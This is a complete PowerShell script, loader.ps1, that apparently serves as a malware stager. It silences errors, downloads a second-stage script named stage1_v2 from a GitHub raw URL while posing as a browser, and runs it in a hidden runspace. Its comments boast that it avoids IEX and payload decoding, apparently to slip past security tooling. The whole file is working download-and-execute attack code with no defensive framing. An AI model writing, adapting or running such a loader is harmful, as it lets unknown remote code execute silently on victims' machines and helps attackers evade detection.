$ErrorActionPreference = 'SilentlyContinue'

# =====================================================================
#  loader.ps1 (Runspace variant, public repo)
#  - fetch stage1_v2 from GitHub raw
#  - execute in a fresh runspace
#  - no IEX, no XOR/gzip decode, no giant inline arrays
# =====================================================================

$Url = 'https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/stage1_v2.ps1'

try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
    $wc.Headers.Add('Accept', 'text/plain')

    $script = $wc.DownloadString($Url)
    if ([string]::IsNullOrWhiteSpace($script)) { return }

    $rs = [RunspaceFactory]::CreateRunspace()
    $rs.ApartmentState = 'STA'
    $rs.ThreadOptions  = 'ReuseThread'
    $rs.Open()

    $ps = [PowerShell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript($script)
    $ps.Invoke() | Out-Null
    $ps.Dispose()
    $rs.Dispose()
} catch { }
